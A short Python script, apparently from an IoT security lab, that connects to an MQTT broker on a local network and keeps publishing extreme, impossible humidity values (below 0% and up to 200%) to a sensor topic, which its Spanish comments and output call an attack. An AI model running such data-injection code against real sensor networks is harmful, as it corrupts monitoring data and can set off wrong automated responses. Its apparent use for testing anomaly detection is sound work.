#!/usr/bin/env python3
import paho.mqtt.client as mqtt
import time
import random

BROKER = "192.168.1.10"
TOPIC = "iot/sensor/humedad"

client = mqtt.Client("attack_humedad")
client.connect(BROKER, 1883, 60)

print("🚨 Iniciando ataque de valores extremos en HUMEDAD...")
while True:
    # Elegimos siempre un valor extremo (ataque)
    if random.random() < 0.5:
        h = round(random.uniform(-20.0, 0.0), 2)   # spike muy bajo
    else:
        h = round(random.uniform(100.0, 200.0), 2) # spike muy alto

    client.publish(TOPIC, str(h))
    print(f"[ATAQUE hum] {h}% enviado")

    # Intervalo fijo o aleatorio corto (para inundar)
    time.sleep(random.randint(30,60))
